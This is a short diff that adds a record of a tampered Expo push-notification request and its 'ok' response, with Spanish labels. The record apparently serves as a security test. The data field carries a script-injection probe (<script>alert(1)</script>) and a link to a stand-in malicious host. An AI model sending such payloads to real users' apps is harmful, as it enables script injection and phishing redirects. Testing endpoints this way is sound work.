@@ -1,0 +1,14 @@
+POST https://exp.host/--/api/v2/push/send
+[
+  {
+    "to": "ExponentPushToken[TDX4…]",
+    "title": "Solicitud alterada",
+    "body": "Mensaje con datos no válidos",
+    "data": {
+      "status": "DELETED",
+      "requestId": "<script>alert(1)</script>",
+      "url": "https://malicioso.example"
+    }
+  }
+]
+Respuesta: {"data":[{"status":"ok","id":"01a1bd4a-5ba8-70c5-ae77-3ab8900642cd"}]}
